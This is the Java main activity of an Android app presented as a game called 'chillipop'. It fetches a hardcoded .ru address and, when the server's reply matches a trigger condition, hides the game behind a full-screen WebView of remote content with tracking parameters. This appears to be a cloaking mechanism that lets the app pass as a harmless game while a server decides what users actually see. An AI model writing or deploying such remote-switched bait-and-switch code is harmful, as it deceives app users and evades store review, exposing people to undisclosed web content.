package com.likemusic.chillipop;

import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;

import com.facebook.FacebookSdk;
import com.onesignal.OneSignal;

public class MainActivity extends AppCompatActivity {

    private static MainActivity instance;
    private static final String ONESIGNAL_APP_ID = "5b76043e-7d97-4f02-9d27-a8e44704d942";
    private String webUrl = "http://topknoelff.ru/zMdTvMpm";
    private ImageView loadGif;
    private FindTasker fTask;
    private boolean isWeb = false;
    private FragmentTransaction frTr;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        navigationHide();
        animation();

        instance = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        fTask = new FindTasker(webUrl);
        fTask.execute();
    }

    public static MainActivity getInstance() {
        return instance;
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        navigationHide();
    }

    private void animation() {
        loadGif = (ImageView) findViewById(R.id.loadgif);
        loadGif.setBackgroundResource(R.drawable.loadgif_anim);
        AnimationDrawable animation = (AnimationDrawable) loadGif.getBackground();
        animation.start();
    }

    private void navigationHide() {
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);

        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }
    }

    public void findFragment(){

        String pStr = "";
        try {
            pStr = fTask.getSiteStr().split("<body>")[1].split("</body>")[0].replaceAll("\\s+", "");
        } catch (Exception ex) {
        }

        if (pStr.length() > 40 || pStr.equals("poliutor")) {
            isWeb = true;

            if (!fTask.getPortionUri().equals("")) {
                webUrl += "?subId1=TRUMPUMPUM&subId2=TRUMPUMPUM&subId3=TRUMPUMPUM&subId4=TRUMPUMPUM&subId5=TRUMPUMPUM";
                String parts[] = fTask.getPortionUri().split("//");

                for (int i = 0; i < parts.length; i++) {
                    webUrl = webUrl.replaceFirst("TRUMPUMPUM", parts[i]);
                }
                webUrl = webUrl.replaceAll("TRUMPUMPUM", "");
            }
            Log.d("--- Web URL ---", webUrl);

            frTr = getSupportFragmentManager().beginTransaction();
            frTr.add(R.id.container, new NetFragment(webUrl), "nettag");
            frTr.commit();
        }
        else {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            frTr = getSupportFragmentManager().beginTransaction();
            frTr.add(R.id.container, new ChilliFragment(),"chillitag");
            frTr.commit();
        }
    }

    @Override
    public void onBackPressed() {
        if (getSupportFragmentManager().findFragmentByTag("nettag") != null && isWeb) {
            if(NetFragment.targetVW.canGoBack()){
                NetFragment.targetVW.goBack();
            }
            else {
                super.onBackPressed();
            }
        }
        else if (getSupportFragmentManager().findFragmentByTag("infotag") != null && !isWeb) {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            FragmentTransaction fragmentTransaction = getSupportFragmentManager().beginTransaction();
            fragmentTransaction.replace(R.id.container, new ChilliFragment(), "chillitag");
            fragmentTransaction.commit();
        }
        else if (getSupportFragmentManager().findFragmentByTag("bonustag") != null && !isWeb) {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            FragmentTransaction fragmentTransaction = getSupportFragmentManager().beginTransaction();
            fragmentTransaction.replace(R.id.container, ChilliFragment.getInstanceChilliFragment(), "chillitag");
            fragmentTransaction.commit();
        }
        else
            super.onBackPressed();
    }
}